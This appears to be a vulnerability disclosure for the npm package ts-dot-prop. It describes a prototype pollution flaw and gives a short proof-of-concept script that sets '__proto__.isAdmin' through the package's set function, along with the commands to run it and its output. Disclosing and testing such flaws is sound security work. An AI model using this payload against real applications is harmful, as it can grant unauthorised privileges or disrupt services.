# Description

`ts-dot-prop` is a typeScript utility to transform nested objects using a dot notation path.
This package is vulnerable to `Prototype Pollution`.
This package fails to restrict access to prototypes of objects, allowing for modification of prototype behavior using a `proto` payload, which may result in Sensitive Information Disclosure/Denial of Service(DoS)/Remote Code Execution.


# Proof of Concept

1. Create the following PoC file:

```
// poc.js
const tsDot = require('ts-dot-prop');
var obj = {}
console.log("Before : " + obj.isAdmin);
tsDot.set(obj, '__proto__.isAdmin', true);
console.log("After : " + obj.isAdmin);

```
2. Execute the following commands in another terminal:

```
npm i ts-dot-prop # Install affected module
node poc.js #  Run the PoC
```
3. Check the Output:
```
Before : undefined
After : true
```
